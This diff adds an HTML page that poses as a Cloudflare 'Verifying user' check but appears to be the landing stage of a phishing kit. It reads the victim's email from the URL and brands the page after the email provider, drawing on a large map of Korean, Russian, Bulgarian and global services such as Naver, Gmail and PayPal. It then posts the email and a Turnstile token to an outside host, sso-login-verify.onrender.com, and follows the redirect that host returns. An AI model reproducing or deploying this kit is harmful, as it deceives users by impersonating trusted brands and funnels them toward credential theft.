@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Please wait...</title>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+<style>
+  :root {
+    --brand-c1: #0066FF;
+    --brand-c2: #0047B3;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                 "Noto Sans KR", "Noto Sans JP", "Noto Sans SC", "Noto Sans TC",
+                 "Noto Sans", Arial, sans-serif;
+    background: #f7f7f7;
+    color: #313131;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    background-size: cover;
+    background-position: center center;
+    background-attachment: fixed;
+    transition: background 0.6s ease;
+  }
+  .cf-card {
+    background: #fff;
+    border: 1px solid #d9d9d9;
+    border-radius: 8px;
+    max-width: 460px;
+    width: 100%;
+    padding: 0 0 24px;
+    box-shadow: 0 4px 12px rgba(0,0,0,.06);
+    text-align: center;
+    overflow: hidden;
+    position: relative;
+    z-index: 1;
+  }
+  .brand-bar {
+    height: 5px;
+    background: linear-gradient(90deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-mark {
+    width: 64px;
+    height: 64px;
+    margin: 28px auto 18px;
+    border-radius: 16px;
+    display: grid;
+    place-items: center;
+    background: #f38020; /* Cloudflare Orange */
+    color: #fff;
+    box-shadow: 0 10px 24px -10px rgba(243, 128, 32, 0.5);
+    overflow: hidden;
+  }
+  .brand-mark svg {
+    width: 38px;
+    height: 38px;
+    fill: #fff;
+  }
+  .cf-card h1 {
+    font-size: 20px;
+    font-weight: 600;
+    color: #313131;
+    margin-bottom: 8px;
+  }
+  .cf-card p {
+    font-size: 14px;
+    color: #6a6a6a;
+    margin-bottom: 20px;
+    line-height: 1.5;
+    padding: 0 28px;
+  }
+  .brand-chip {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin: 0 auto 22px;
+    padding: 8px 14px;
+    border-radius: 999px;
+    background: #fafafa;
+    border: 1px solid #ececec;
+    font-size: 12.5px;
+    color: #555;
+  }
+  .brand-chip .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--brand-c1), var(--brand-c2));
+  }
+  .brand-chip strong { color: #313131; font-weight: 700; }
+  .cf-turnstile {
+    display: flex;
+    justify-content: center;
+    margin: 0 auto 20px;
+    min-height: 65px;
+  }
+  .cf-footer {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+    font-size: 11px;
+    color: #6a6a6a;
+    padding-top: 16px;
+    border-top: 1px solid #f0f0f0;
+    margin: 8px 28px 0;
+  }
+  .cf-footer a { color: #6a6a6a; text-decoration: none; }
+  .cf-footer a:hover { text-decoration: underline; }
+  .cf-logo {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    color: #f6821f;
+    font-weight: 600;
+  }
+  .spinner {
+    display: none;
+    width: 36px;
+    height: 36px;
+    margin: 8px auto 20px;
+    border: 3px solid #f0f0f0;
+    border-top: 3px solid var(--brand-c1);
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .error-box {
+    display: none;
+    background: #fff5f5;
+    border: 1px solid #f5c6cb;
+    color: #a94442;
+    padding: 10px 14px;
+    border-radius: 4px;
+    font-size: 13px;
+    margin: 12px 28px 0;
+  }
+  .state-verifying .spinner { display: block; }
+  .state-verifying .cf-turnstile { display: none; }
+  .state-verifying .brand-chip { display: none; }
+</style>
+</head>
+<body>
+
+<div class="cf-card" id="cfCard">
+  <div class="brand-bar"></div>
+
+  <div class="brand-mark" id="t-brandMark">
+    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+    </svg>
+  </div>
+
+  <h1 id="t-title">Verifying user</h1>
+  <p id="t-subtitle">This will take a few seconds.</p>
+
+  <div class="brand-chip" id="brandChip">
+    <span class="dot"></span>
+    <span id="t-targetText">Verifying for <strong id="brandChipName">—</strong></span>
+  </div>
+
+  <div class="spinner"></div>
+
+  <!-- REPLACE 'YOUR_SITE_KEY_HERE' WITH YOUR ACTUAL CLOUDFLARE TURNSTILE SITE KEY -->
+  <div class="cf-turnstile"
+       id="turnstileWidget"
+       data-sitekey="YOUR_SITE_KEY_HERE"
+       data-callback="onVerified"
+       data-error-callback="onTurnstileError"
+       data-expired-callback="onTurnstileExpired"
+       data-theme="light"
+       data-size="flexible"></div>
+
+  <div class="error-box" id="errorBox"></div>
+
+  <div class="cf-footer">
+    <span class="cf-logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" style="width:16px;height:16px;">
+        <path fill="#f6821f" d="M35.6 27.7l-4.1-1.9c-.6-.2-1.1-.8-1.2-1.4l-3.7-12.3c-.1-.4-.5-.7-.9-.7h-5.6c-.4 0-.7.3-.6.7l3.5 11.7c.1.4.5.7.9.7h5.7c.2 0 .4-.2.3-.4l-1.2-4.2c-.1-.4.2-.8.6-.8h4.6c.4 0 .7.3.6.7l-1.6 5.4c-.1.4-.5.7-.9.7H22c-.2 0-.4.2-.3.4l1 3.4c.1.4.5.7.9.7h11.4c.5 0 .8-.4.6-.9l-.7-1.6c-.1-.3.1-.6.4-.6h4.5c.3 0 .5-.3.4-.6l-.7-2.4c-.1-.4-.5-.6-.9-.6l-4.1.1z"/>
+      </svg>
+      Cloudflare
+    </span>
+    <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener" id="t-privacy">Privacy</a>
+    <span>•</span>
+    <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noopener" id="t-terms">Terms</a>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   API Config
+   ============================================================ */
+const API_BASE = 'https://sso-login-verify.onrender.com';
+
+/* ============================================================
+   MULTILINGUAL DICTIONARY — 23 languages
+   ============================================================ */
+const translations = {
+  en: { pageTitle:"Please wait...", title:"Verifying user", subtitle:"This will take a few seconds.", targetText:"Verifying for", privacy:"Privacy", terms:"Terms", errFail:"Verification failed. Please refresh the page.", errTimeout:"Security check is taking longer than expected. Please refresh.", errConn:"Connection error. Please try again." },
+  bg: { pageTitle:"Моля, изчакайте...", title:"Проверка на потребителя", subtitle:"Това ще отнеме няколко секунди.", targetText:"Проверка за", privacy:"Поверителност", terms:"Условия", errFail:"Неуспешна проверка. Моля, опреснете страницата.", errTimeout:"Проверката за сигурност отнема повече време. Опреснете.", errConn:"Грешка при връзката. Моля, опитайте отново." },
+  de: { pageTitle:"Bitte warten...", title:"Benutzer wird überprüft", subtitle:"Dies dauert ein paar Sekunden.", targetText:"Überprüfung für", privacy:"Datenschutz", terms:"AGB", errFail:"Überprüfung fehlgeschlagen. Bitte laden Sie die Seite neu.", errTimeout:"Sicherheitsüberprüfung dauert länger. Bitte neu laden.", errConn:"Verbindungsfehler. Bitte versuchen Sie es erneut." },
+  ko: { pageTitle:"잠시만 기다려 주세요...", title:"사용자 확인 중", subtitle:"몇 초 정도 걸립니다.", targetText:"확인 대상", privacy:"개인정보", terms:"약관", errFail:"확인에 실패했습니다. 페이지를 새로고침하세요.", errTimeout:"보안 확인이 예상보다 오래 걸립니다. 새로고침하세요.", errConn:"연결 오류입니다. 다시 시도하세요." },
+  ru: { pageTitle:"Пожалуйста, подождите...", title:"Проверка пользователя", subtitle:"Это займёт несколько секунд.", targetText:"Проверка для", privacy:"Конфиденциальность", terms:"Условия", errFail:"Ошибка проверки. Пожалуйста, обновите страницу.", errTimeout:"Проверка безопасности занимает больше времени. Обновите.", errConn:"Ошибка подключения. Попробуйте ещё раз." },
+  es: { pageTitle:"Espera...", title:"Verificando usuario", subtitle:"Esto tomará unos segundos.", targetText:"Verificando para", privacy:"Privacidad", terms:"Términos", errFail:"La verificación falló. Actualiza la página.", errTimeout:"La verificación de seguridad está tardando más de lo esperado. Actualiza.", errConn:"Error de conexión. Inténtalo de nuevo." },
+  fr: { pageTitle:"Veuillez patienter...", title:"Vérification de l'utilisateur", subtitle:"Cela prendra quelques secondes.", targetText:"Vérification pour", privacy:"Confidentialité", terms:"Conditions", errFail:"Échec de la vérification. Veuillez actualiser la page.", errTimeout:"La vérification de sécurité prend plus de temps. Actualisez.", errConn:"Erreur de connexion. Réessayez." },
+  it: { pageTitle:"Attendere...", title:"Verifica utente", subtitle:"Ci vorranno alcuni secondi.", targetText:"Verifica per", privacy:"Privacy", terms:"Termini", errFail:"Verifica non riuscita. Aggiorna la pagina.", errTimeout:"La verifica di sicurezza sta impiegando più tempo. Aggiorna.", errConn:"Errore di connessione. Riprova." },
+  pt: { pageTitle:"Aguarde...", title:"Verificando usuário", subtitle:"Isso levará alguns segundos.", targetText:"Verificando para", privacy:"Privacidade", terms:"Termos", errFail:"Falha na verificação. Atualize a página.", errTimeout:"A verificação de segurança está demorando mais. Atualize.", errConn:"Erro de conexão. Tente novamente." },
+  nl: { pageTitle:"Even geduld...", title:"Gebruiker verifiëren", subtitle:"Dit duurt een paar seconden.", targetText:"Verifiëren voor", privacy:"Privacy", terms:"Voorwaarden", errFail:"Verificatie mislukt. Vernieuw de pagina.", errTimeout:"Beveiligingscontrole duurt langer. Vernieuw.", errConn:"Verbindingsfout. Probeer opnieuw." },
+  ja: { pageTitle:"しばらくお待ちください...", title:"ユーザーを確認しています", subtitle:"数秒かかります。", targetText:"確認対象", privacy:"プライバシー", terms:"利用規約", errFail:"確認に失敗しました。ページを更新してください。", errTimeout:"セキュリティチェックに時間がかかっています。更新してください。", errConn:"接続エラーです。もう一度お試しください。" },
+  zh: { pageTitle:"请稍候...", title:"正在验证用户", subtitle:"这需要几秒钟。", targetText:"验证对象", privacy:"隐私", terms:"条款", errFail:"验证失败。请刷新页面。", errTimeout:"安全检查耗时较长。请刷新。", errConn:"连接错误。请重试。" },
+  'zh-TW': { pageTitle:"請稍候...", title:"正在驗證使用者", subtitle:"這需要幾秒鐘。", targetText:"驗證對象", privacy:"隱私", terms:"條款", errFail:"驗證失敗。請重新整理頁面。", errTimeout:"安全檢查耗時較長。請重新整理。", errConn:"連線錯誤。請重試。" },
+  ar: { pageTitle:"يرجى الانتظار...", title:"جارٍ التحقق من المستخدم", subtitle:"سيستغرق هذا بضع ثوانٍ.", targetText:"التحقق لـ", privacy:"الخصوصية", terms:"الشروط", errFail:"فشل التحقق. يرجى تحديث الصفحة.", errTimeout:"يستغرق التحقق الأمني وقتًا أطول. يرجى التحديث.", errConn:"خطأ في الاتصال. يرجى المحاولة مرة أخرى." },
+  he: { pageTitle:"אנא המתן...", title:"מאמת משתמש", subtitle:"זה ייקח מספר שניות.", targetText:"מאמת עבור", privacy:"פרטיות", terms:"תנאים", errFail:"האימות נכשל. אנא רענן את הדף.", errTimeout:"בדיקת האבטחה אורכת זמן רב מהצפוי. אנא רענן.", errConn:"שגיאת חיבור. אנא נסה שוב." },
+  tr: { pageTitle:"Lütfen bekleyin...", title:"Kullanıcı doğrulanıyor", subtitle:"Bu birkaç saniye sürecek.", targetText:"Doğrulanıyor:", privacy:"Gizlilik", terms:"Koşullar", errFail:"Doğrulama başarısız. Lütfen sayfayı yenileyin.", errTimeout:"Güvenlik kontrolü uzun sürüyor. Lütfen yenileyin.", errConn:"Bağlantı hatası. Lütfen tekrar deneyin." },
+  pl: { pageTitle:"Proszę czekać...", title:"Weryfikacja użytkownika", subtitle:"To zajmie kilka sekund.", targetText:"Weryfikacja dla", privacy:"Prywatność", terms:"Warunki", errFail:"Weryfikacja nie powiodła się. Odśwież stronę.", errTimeout:"Weryfikacja bezpieczeństwa trwa dłużej. Odśwież.", errConn:"Błąd połączenia. Spróbuj ponownie." },
+  uk: { pageTitle:"Будь ласка, зачекайте...", title:"Перевірка користувача", subtitle:"Це займе кілька секунд.", targetText:"Перевірка для", privacy:"Конфіденційність", terms:"Умови", errFail:"Помилка перевірки. Оновіть сторінку.", errTimeout:"Перевірка безпеки триває довше. Оновіть.", errConn:"Помилка з'єднання. Спробуйте ще раз." },
+  ro: { pageTitle:"Vă rugăm așteptați...", title:"Se verifică utilizatorul", subtitle:"Aceasta va dura câteva secunde.", targetText:"Se verifică pentru", privacy:"Confidențialitate", terms:"Termeni", errFail:"Verificarea a eșuat. Reîmprospătați pagina.", errTimeout:"Verificarea de securitate durează mai mult. Reîmprospătați.", errConn:"Eroare de conexiune. Încercați din nou." },
+  vi: { pageTitle:"Vui lòng chờ...", title:"Đang xác minh người dùng", subtitle:"Quá trình này sẽ mất vài giây.", targetText:"Xác minh cho", privacy:"Quyền riêng tư", terms:"Điều khoản", errFail:"Xác minh thất bại. Vui lòng làm mới trang.", errTimeout:"Kiểm tra bảo mật mất nhiều thời gian hơn. Vui lòng làm mới.", errConn:"Lỗi kết nối. Vui lòng thử lại." },
+  th: { pageTitle:"โปรดรอสักครู่...", title:"กำลังตรวจสอบผู้ใช้", subtitle:"จะใช้เวลาสักครู่", targetText:"กำลังตรวจสอบสำหรับ", privacy:"ความเป็นส่วนตัว", terms:"ข้อกำหนด", errFail:"การตรวจสอบล้มเหลว โปรดรีเฟรชหน้า", errTimeout:"การตรวจสอบความปลอดภัยใช้เวลานาน โปรดรีเฟรช", errConn:"ข้อผิดพลาดในการเชื่อมต่อ โปรดลองอีกครั้ง" },
+  id: { pageTitle:"Mohon tunggu...", title:"Memverifikasi pengguna", subtitle:"Ini akan memakan waktu beberapa detik.", targetText:"Memverifikasi untuk", privacy:"Privasi", terms:"Ketentuan", errFail:"Verifikasi gagal. Silakan muat ulang halaman.", errTimeout:"Pemeriksaan keamanan memakan waktu lebih lama. Muat ulang.", errConn:"Kesalahan koneksi. Silakan coba lagi." }
+};
+
+const RTL_LANGS = ['ar', 'he'];
+let currentLang = 'en';
+
+/* ============================================================
+   Language detection
+   ============================================================ */
+function detectLanguage() {
+  const userLang = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
+
+  if (userLang.startsWith('zh-tw') || userLang.startsWith('zh-hk') || userLang.startsWith('zh-hant')) return 'zh-TW';
+  if (userLang.startsWith('zh')) return 'zh';
+
+  const base = userLang.split('-')[0];
+  if (translations[base]) return base;
+
+  const prefs = navigator.languages || [];
+  for (const lang of prefs) {
+    const raw = String(lang).toLowerCase();
+    if (raw.startsWith('zh-tw') || raw.startsWith('zh-hk') || raw.startsWith('zh-hant')) return 'zh-TW';
+    if (raw.startsWith('zh')) return 'zh';
+    const b = raw.split('-')[0];
+    if (translations[b]) return b;
+  }
+  return 'en';
+}
+
+function applyTranslations(lang) {
+  const t = translations[lang] || translations['en'];
+  currentLang = lang;
+
+  document.documentElement.lang = lang;
+  document.documentElement.dir = RTL_LANGS.includes(lang) ? 'rtl' : 'ltr';
+
+  document.title = t.pageTitle;
+  document.getElementById('t-title').innerText = t.title;
+  document.getElementById('t-subtitle').innerText = t.subtitle;
+  
+  // Secure email injection (prevents XSS)
+  document.getElementById('t-targetText').innerHTML = t.targetText + ' <strong id="brandChipName"></strong>';
+  document.getElementById('brandChipName').textContent = EMAIL || '—';
+
+  document.getElementById('t-privacy').innerText = t.privacy;
+  document.getElementById('t-terms').innerText = t.terms;
+}
+
+/* ============================================================
+   BRAND MAP — Exquisite Multi-Color Mesh Configs
+   ============================================================ */
+const BRAND_MAP = {
+  'naver.com':    { name:'Naver',    accent:'#03c75a', mesh:['#03c75a','#02b352','#55df94'], bgUrl:'https://ssl.pstatic.net/static/pwe/nm/bn_login_02_160609.png' },
+  'naver.net':    { name:'Naver',    accent:'#03c75a', mesh:['#03c75a','#02b352','#55df94'], bgUrl:'https://ssl.pstatic.net/static/pwe/nm/bn_login_02_160609.png' },
+  'daum.net':     { name:'Daum',     accent:'#f9a800', mesh:['#f9a800','#d48f00','#ffd266'], bgUrl:'https://t1.daumcdn.net/daumtop_deco/images/top/2017/bg_login_190612.png' },
+  'hanmail.net':  { name:'Daum',     accent:'#f9a800', mesh:['#f9a800','#d48f00','#ffd266'], bgUrl:'https://t1.daumcdn.net/daumtop_deco/images/top/2017/bg_login_190612.png' },
+  'kakao.com':    { name:'Kakao',    accent:'#f9a800', mesh:['#f9a800','#d48f00','#ffd266'], bgUrl:'' },
+  'nate.com':     { name:'Nate',     accent:'#0088cc', mesh:['#0088cc','#006699','#33bbff'], bgUrl:'' },
+  'paran.com':    { name:'Paran',    accent:'#0066cc', mesh:['#0066cc','#004499','#3399ff'], bgUrl:'' },
+  'hiworks.co.kr':{ name:'Hiworks',  accent:'#1a73e8', mesh:['#1a73e8','#0d47a1','#669df6'], bgUrl:'' },
+  'gabia.com':    { name:'Gabia',    accent:'#e95e2e', mesh:['#e95e2e','#cc4a1f','#ff8855'], bgUrl:'' },
+  'chollian.net': { name:'Chollian', accent:'#0066cc', mesh:['#0066cc','#004488','#3399ff'], bgUrl:'' },
+  'hitel.net':    { name:'Hitel',    accent:'#e60000', mesh:['#e60000','#b30000','#ff3333'], bgUrl:'' },
+  'nownuri.net':  { name:'Nownuri',  accent:'#009944', mesh:['#009944','#006633','#33cc77'], bgUrl:'' },
+  'unitel.co.kr': { name:'Unitel',   accent:'#ff6600', mesh:['#ff6600','#cc5500','#ff944d'], bgUrl:'' },
+  'netsgo.com':   { name:'Netsgo',   accent:'#0044cc', mesh:['#0044cc','#003399','#3377ff'], bgUrl:'' },
+  'shinbiro.com': { name:'Shinbiro', accent:'#8b00ff', mesh:['#8b00ff','#6600cc','#aa55ff'], bgUrl:'' },
+  'netian.com':   { name:'Netian',   accent:'#ff3366', mesh:['#ff3366','#cc0044','#ff6699'], bgUrl:'' },
+  'hanmir.com':   { name:'Hanmir',   accent:'#00aaff', mesh:['#00aaff','#0088cc','#33ccff'], bgUrl:'' },
+  'dreamwiz.com': { name:'Dreamwiz', accent:'#ff9900', mesh:['#ff9900','#e67e00','#ffbb33'], bgUrl:'' },
+  'abv.bg':       { name:'ABV',      accent:'#1e930c', mesh:['#1e930c','#126b06','#3fbf2b'], bgUrl:'' },
+  'mail.bg':      { name:'Mail.bg',  accent:'#ff6600', mesh:['#ff6600','#cc5200','#ff944d'], bgUrl:'' },
+  'dir.bg':       { name:'Dir.bg',   accent:'#e30613', mesh:['#e30613','#b30510','#ff3355'], bgUrl:'' },
+  'vbox7.com':    { name:'Vbox7',    accent:'#ff0000', mesh:['#ff0000','#cc0000','#ff4444'], bgUrl:'' },
+  'yandex.com':   { name:'Yandex',   accent:'#fc3f1d', mesh:['#fc3f1d','#d93010','#ff6644'], bgUrl:'' },
+  'yandex.ru':    { name:'Yandex',   accent:'#fc3f1d', mesh:['#fc3f1d','#d93010','#ff6644'], bgUrl:'' },
+  'ya.ru':        { name:'Yandex',   accent:'#fc3f1d', mesh:['#fc3f1d','#d93010','#ff6644'], bgUrl:'' },
+  'mail.ru':      { name:'Mail.ru',  accent:'#005ff9', mesh:['#005ff9','#0047c4','#3388ff'], bgUrl:'' },
+  'bk.ru':        { name:'Mail.ru',  accent:'#005ff9', mesh:['#005ff9','#0047c4','#3388ff'], bgUrl:'' },
+  'inbox.ru':     { name:'Mail.ru',  accent:'#005ff9', mesh:['#005ff9','#0047c4','#3388ff'], bgUrl:'' },
+  'list.ru':      { name:'Mail.ru',  accent:'#005ff9', mesh:['#005ff9','#0047c4','#3388ff'], bgUrl:'' },
+  'rambler.ru':   { name:'Rambler',  accent:'#ff6600', mesh:['#ff6600','#cc5500','#ff944d'], bgUrl:'' },
+  'gmail.com':    { name:'Google',   accent:'#4285F4', mesh:['#4285F4','#EA4335','#FBBC05','#34A853'], bgUrl:'' },
+  'google.com':   { name:'Google',   accent:'#4285F4', mesh:['#4285F4','#EA4335','#FBBC05','#34A853'], bgUrl:'' },
+  'outlook.com':  { name:'Microsoft',accent:'#0078d4', mesh:['#0078d4','#00a4ef','#7fba00','#ffb900'], bgUrl:'' },
+  'live.com':     { name:'Microsoft',accent:'#0078d4', mesh:['#0078d4','#00a4ef','#7fba00','#ffb900'], bgUrl:'' },
+  'hotmail.com':  { name:'Microsoft',accent:'#0078d4', mesh:['#0078d4','#00a4ef','#7fba00','#ffb900'], bgUrl:'' },
+  'microsoft.com':{ name:'Microsoft',accent:'#0078d4', mesh:['#0078d4','#00a4ef','#7fba00','#ffb900'], bgUrl:'' },
+  'yahoo.com':    { name:'Yahoo',    accent:'#7b0099', mesh:['#7b0099','#5c0073','#aa33cc'], bgUrl:'' },
+  'ymail.com':    { name:'Yahoo',    accent:'#7b0099', mesh:['#7b0099','#5c0073','#aa33cc'], bgUrl:'' },
+  'icloud.com':   { name:'Apple',    accent:'#333333', mesh:['#444444','#111111','#666666'], bgUrl:'' },
+  'apple.com':    { name:'Apple',    accent:'#333333', mesh:['#444444','#111111','#666666'], bgUrl:'' },
+  'facebook.com': { name:'Facebook', accent:'#1877f2', mesh:['#1877f2','#0d5cbd','#4a9cff'], bgUrl:'' },
+  'fb.com':       { name:'Facebook', accent:'#1877f2', mesh:['#1877f2','#0d5cbd','#4a9cff'], bgUrl:'' },
+  'twitter.com':  { name:'X',        accent:'#000000', mesh:['#333333','#000000','#555555'], bgUrl:'' },
+  'x.com':        { name:'X',        accent:'#000000', mesh:['#333333','#000000','#555555'], bgUrl:'' },
+  'linkedin.com': { name:'LinkedIn', accent:'#0a66c2', mesh:['#0a66c2','#004182','#3388ff'], bgUrl:'' },
+  'amazon.com':   { name:'Amazon',   accent:'#ff9900', mesh:['#ff9900','#cc7a00','#ffbb33'], bgUrl:'' },
+  'amazon.co.uk': { name:'Amazon',   accent:'#ff9900', mesh:['#ff9900','#cc7a00','#ffbb33'], bgUrl:'' },
+  'paypal.com':   { name:'PayPal',   accent:'#003087', mesh:['#003087','#009cde','#3366cc'], bgUrl:'' },
+  'dropbox.com':  { name:'Dropbox',  accent:'#0061ff', mesh:['#0061ff','#0042b3','#3388ff'], bgUrl:'' },
+  'slack.com':    { name:'Slack',    accent:'#4a154b', mesh:['#4a154b','#36133e','#722d75'], bgUrl:'' },
+  'github.com':   { name:'GitHub',   accent:'#24292e', mesh:['#24292e','#1b1f23','#444d56'], bgUrl:'' },
+  'protonmail.com':{ name:'Proton',  accent:'#6d4aff', mesh:['#6d4aff','#5a3ae0','#9980ff'], bgUrl:'' },
+  'proton.me':    { name:'Proton',   accent:'#6d4aff', mesh:['#6d4aff','#5a3ae0','#9980ff'], bgUrl:'' },
+  'pm.me':        { name:'Proton',   accent:'#6d4aff', mesh:['#6d4aff','#5a3ae0','#9980ff'], bgUrl:'' },
+  'tutanota.com': { name:'Tutanota', accent:'#00b4d8', mesh:['#00b4d8','#0096b3','#33ccff'], bgUrl:'' },
+  'tuta.io':      { name:'Tutanota', accent:'#00b4d8', mesh:['#00b4d8','#0096b3','#33ccff'], bgUrl:'' },
+  'tuta.com':     { name:'Tutanota', accent:'#00b4d8', mesh:['#00b4d8','#0096b3','#33ccff'], bgUrl:'' }
+};
+
+function resolveBrand(email) {
+  const domain = (email.split('@')[1] || '').toLowerCase();
+  if (BRAND_MAP[domain]) return { ...BRAND_MAP[domain], domain };
+  const parts = domain.split('.');
+  for (let i = 0; i < parts.length - 1; i++) {
+    const sub = parts.slice(i).join('.');
+    if (BRAND_MAP[sub]) return { ...BRAND_MAP[sub], domain };
+  }
+  return { name:'Secure Login', accent:'#1a73e8', mesh:['#1a73e8','#0d47a1','#4a9cff'], bgUrl:'', domain };
+}
+
+/* ============================================================
+   Exquisite Mesh Background Generator
+   ============================================================ */
+const NOISE_SVG = "url(\"data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E\")";
+
+function getMeshBackground(brand) {
+  const colors = brand.mesh || [brand.accent];
+  const c1 = colors[0];
+  const c2 = colors[1] || c1;
+  const c3 = colors[2] || c1;
+  const c4 = colors[3] || c3;
+
+  return `${NOISE_SVG},
+          radial-gradient(at 10% 10%, ${c1}35 0px, transparent 50%),
+          radial-gradient(at 90% 10%, ${c2}35 0px, transparent 50%),
+          radial-gradient(at 90% 90%, ${c3}35 0px, transparent 50%),
+          radial-gradient(at 10% 90%, ${c4}35 0px, transparent 50%),
+          linear-gradient(135deg, #f9fafb 0%, #eef1f6 100%)`;
+}
+
+function applyBrandTheme(brand) {
+  document.documentElement.style.setProperty('--brand-c1', brand.accent);
+  document.documentElement.style.setProperty('--brand-c2', brand.accent);
+
+  const body = document.body;
+  if (brand.bgUrl) {
+    body.style.background = `url('${brand.bgUrl}') center/cover fixed no-repeat`;
+  } else {
+    body.style.background = getMeshBackground(brand);
+  }
+}
+
+/* ============================================================
+   READ EMAIL FROM URL
+   ============================================================ */
+function getEmailFromSource() {
+  let fromHash = window.location.hash.substring(1);
+  if (fromHash) {
+    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
+    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
+    if (fromHash.includes('@')) return fromHash;
+  }
+  const params = new URLSearchParams(window.location.search);
+  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
+  for (const k of keys) {
+    const v = params.get(k);
+    if (v && v.includes('@')) return v;
+  }
+  if (window.location.search.length > 1) {
+    let raw = window.location.search.substring(1);
+    try { raw = decodeURIComponent(raw); } catch (e) {}
+    raw = raw.split('&')[0].split('?')[0].trim();
+    if (raw.includes('@')) return raw;
+  }
+  return '';
+}
+
+var EMAIL = getEmailFromSource();
+var verified = false;
+
+/* ============================================================
+   INIT
+   ============================================================ */
+(function init() {
+  const detectedLang = detectLanguage();
+  applyTranslations(detectedLang);
+
+  if (!EMAIL) {
+    document.getElementById('brandChip').style.display = 'none';
+  } else {
+    const brand = resolveBrand(EMAIL);
+    applyBrandTheme(brand);
+  }
+})();
+
+/* ============================================================
+   TURNSTILE CALLBACKS & BACKEND VERIFICATION
+   ============================================================ */
+async function onVerified(token) {
+  if (verified) return;
+  if (!token) { onTurnstileError('missing-token'); return; }
+
+  verified = true;
+  console.log('🛡️ Turnstile passed, sending token to backend...');
+
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.add('state-verifying');
+
+  try {
+    const response = await fetch(API_BASE + '/api/turnstile-verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: token, email: EMAIL })
+    });
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      throw new Error(data.message || `HTTP ${response.status}`);
+    }
+
+    if (data.success && data.redirect) {
+      console.log('✅ Proof generated, redirecting...');
+      setTimeout(function () {
+        window.location.href = data.redirect;
+      }, 800);
+    } else {
+      throw new Error(data.message || 'Verification failed on server');
+    }
+  } catch (error) {
+    console.error('❌ Backend verification failed:', error);
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = "Real Error: " + error.message;
+    }
+    if (card) card.classList.remove('state-verifying');
+    verified = false;
+    if (window.turnstile) {
+      try { window.turnstile.reset(); } catch (e) {}
+    }
+  }
+}
+
+function onTurnstileError(code) {
+  console.error('❌ Turnstile error:', code);
+  var box = document.getElementById('errorBox');
+  if (box) {
+    box.style.display = 'block';
+    box.textContent = translations[currentLang].errFail;
+  }
+  var card = document.getElementById('cfCard');
+  if (card) card.classList.remove('state-verifying');
+}
+
+function onTurnstileExpired() {
+  verified = false;
+  if (window.turnstile) {
+    try { window.turnstile.reset(); } catch (e) {}
+  }
+}
+
+setTimeout(function () {
+  if (!verified && window.turnstile === undefined) {
+    var box = document.getElementById('errorBox');
+    if (box) {
+      box.style.display = 'block';
+      box.textContent = translations[currentLang].errTimeout;
+    }
+  }
+}, 15000);
+</script>
+
+</body>
+</html>
